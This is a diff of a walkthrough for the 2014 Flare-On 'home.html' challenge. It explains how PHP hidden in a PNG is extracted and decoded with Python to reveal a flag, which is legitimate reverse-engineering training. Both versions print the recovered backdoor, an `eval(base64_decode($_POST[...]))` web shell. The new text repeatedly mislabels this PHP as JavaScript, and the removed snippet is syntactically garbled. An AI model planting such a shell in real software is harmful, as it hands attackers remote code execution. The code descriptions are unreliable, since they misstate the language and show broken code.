@@ -1,50 +1,113 @@
-# Decoding `home.html` Walkthrough
+# Flare-On Challenge Walkthrough 2014: **`home.html`** Analysis
 
-In this guide, we’ll break down the process of analyzing `home.html` to extract and decode hidden content. This walkthrough will detail the steps needed to examine embedded PHP code and decode the scripts using Python.
+In this walkthrough, we’ll break down the process of analyzing the `home.html` file from the Flare-On challenge. This guide will help you extract and decode a hidden PHP-encoded script embedded in a PNG image. By leveraging Python scripts and a hex editor, we will decode the hidden content and reveal the payload.
 
 ## Table of Contents
-1. [Introduction](#introduction)
-2. [Step 1: Inspect `home.html` with a Browser's Developer Tools](#step-1-inspect-homehtml-with-a-browsers-developer-tools)
-3. [Step 2: Examine `flare-on.png` for Embedded PHP Code](#step-2-examine-flare-onpng-for-embedded-php-code)
-4. [Step 3: Analyze the Initial `do_me` Statement and Extract JavaScript](#step-3-analyze-the-initial-do_me-statement-and-extract-javascript)
-
+- [Introduction](#introduction)
+- [Step 1: Inspect `home.html` with Browser Developer Tools](#step-1-inspect-homehtml-with-browser-developer-tools)
+- [Step 2: Examine `flare-on.png` for Embedded PHP Code](#step-2-examine-flare-onpng-for-embedded-php-code)
+- [Step 3: Decode the PHP Code and Extract JavaScript](#step-3-decode-the-php-code-and-extract-javascript)
+- [Step 4: The Flag](#step-4-the-flag)
+- [References](#references)
 ---
 
 ## Introduction
 
-This walkthrough focuses on analyzing the `home.html` file to uncover a hidden script embedded as a PNG file using PHP. The PHP code within the PNG is then processed to reveal a JavaScript snippet. We'll use tools like a hex editor and Python scripts to decode and understand these hidden components.
+In this challenge, the goal is to decode hidden content embedded in a PNG file via PHP code. The content is encoded in Base64 and contains escape sequences that must be resolved to reveal the final JavaScript code.
+
+We'll walk through the steps of inspecting `home.html`, extracting PHP code from the `flare-on.png`, decoding Base64 strings, and decoding escape sequences to uncover the JavaScript payload.
 
 ---
 
-## Step 1: Inspect `home.html` with a Browser's Developer Tools
+## Step 1: Inspect `home.html` with Browser Developer Tools
 
-1. Open `home.html` in a browser with developer tools enabled.
-2. Locate the PHP include statement embedded between `<script>` tags in the HTML source:
-   ```html
-   </script>
-   ** <?php include "img/flare-on.png" ?> **
-   <script type="text/javascript">
-   ```
-   - This is an unconventional way of embedding a PNG file as PHP code, which is suspicious and may indicate hidden content or a payload.
+1. **Open `home.html` in a browser**:
+   - With developer tools enabled, open the `home.html` file.
+   - Upon inspection, you'll notice that the HTML contains an image tag for `img/flare-on.png` and an embedded PHP script.
+   - Specifically, you’ll see an unconventional PHP `include` statement inside a `<script>` tag, like this:
+
+     ```html
+     <script src=...</script>
+     <!--?php include "img/flare-on.png" ?-->
+     <script src=...</script>
+     ```
+
+2. **What this indicates**:
+   - This suggests that PHP code might be embedded in the `flare-on.png` image file. We’ll need to analyze the image to extract the PHP code and proceed with further decoding.
+   - The next step involves inspecting `flare-on.png` in a hex editor to extract the embedded PHP code.
 
 ---
 
 ## Step 2: Examine `flare-on.png` for Embedded PHP Code
 
-1. Open `flare-on.png` in a hex editor and navigate to offset `19c4` to locate any embedded PHP code.
-2. Extract the PHP code from the PNG and save it as `1_php.php`.
-3. Convert the extracted PHP code into a Python format and save it as `1_php.py` for further analysis.
+1. **Open `flare-on.png` in a hex editor**:
+   - We open `flare-on.png` using a hex editor. The goal here is to search for embedded PHP code.
+   - Search for the string `<?php` to locate where the PHP code begins in the image.
+
+2. **Extract the PHP code**:
+   - We find the PHP code starting at offset `0x19c4` in the file.
+   - Copy the PHP code from this offset and save it to a new file called `extracted_php.php`.
+
+3. **PHP Code Breakdown**:
+    - Contains an array `$terms` with 80 characters and another array `$order` that defines the order in which these characters will be rearranged to form a string.
+    - Uses the `$order` array to shuffle characters from the `$terms` array to create a string. The result is stored in the `$do_me` variable, which will be executed later as part of the hidden payload.
 
 ---
 
-## Step 3: Analyze the Initial `do_me` Statement and Extract JavaScript
+## Step 3: Decode the PHP Code and Extract JavaScript
 
-1. Run the Python script `1_php.py` to print the first `do_me` statement that would be executed.
-2. Save the next JavaScript code block that is printed by `1_php.py` as `2_js.py` for further investigation.
-3. Use `2_decode.py` to deobfuscate the JavaScript code, revealing the true content.
-4. After deobfuscation, the following PHP code snippet is exposed:
-   ```php
-   base64_decode(
-       $code=base64_decode(if(isset($_POST["a11DOTthatDOTjava5crapATflareDASHonDOTcom"])); });
+1. **Python Conversion**:
+   - After extracting the PHP code, we convert it into Python. The goal is to simulate the PHP array shuffling process and extract the resulting string (the `$do_me` variable).
+   
+   Here is a simplified breakdown of the Python script `converted_php.py`:
+   
+   ```python
+   terms = ["..."]  # 80 characters from PHP code
+   order = [...]  # Indices for the character order
+
+   do_me = ''.join([terms[i] for i in order])
+   print(do_me)
+   ```
+
+   The Python script prints the resulting value of `$do_me`, which contains a Base64-encoded JavaScript code.
+   
+2. **Base64 Decoding**:
+   - We then use the Python script `convert_js.py` to decode the Base64-encoded JavaScript.
+   - The process involves:
+     - Decoding two Base64-encoded strings: one for `$_` and another for `$__`.
+     - Combining both strings to form a partially obfuscated JavaScript code.
+
+   The Python script also decodes hexadecimal (`\x4F`) and decimal (`\97`) escape sequences in the decoded code. This results in the following final JavaScript code:
+
+   ```javascript
+   if (isset($_POST["a11DOTthatDOTjava5crapATflareDASHonDOTcom"])) { 
+       eval(base64_decode($_POST["a11DOTthatDOTjava5crapATflareDASHonDOTcom"])); 
+   }
+   eval(base64_decode($_));
    eval($code);
    ```
+
+   This JavaScript contains functionality to execute Base64-decoded content received through a POST request, which is a typical web-based payload.
+
+---
+
+## Step 4: The Flag
+
+The de-obfuscated JavaScript reveals an important action: it checks for a specific POST request and decodes its Base64 content. This can be used to trigger further actions on the server or extract sensitive information.
+
+  - **Flag:**
+    ```
+    Original: a11DOTthatDOTjava5crapATflareDASHonDOTcom
+    Readable: a11.that.java5crap@flare-on.com
+    ```
+
+---
+
+## References
+- **Hex Editor**: Allows you to see the raw binary content of a file, making it possible to find hidden data or scripts embedded within files.
+
+- **Browser Developer Tools**: Provide an easy way to explore the structure and content of a web page.
+
+- **Base64 Decoder**: Often used to obfuscate data, and decoding it reveals the original payload.
+
+Escape Sequence Decoder: The final step involved decoding hexadecimal and decimal escape sequences. These sequences represent characters encoded in a way that obfuscates the code further, and resolving them makes the code readable and executable.
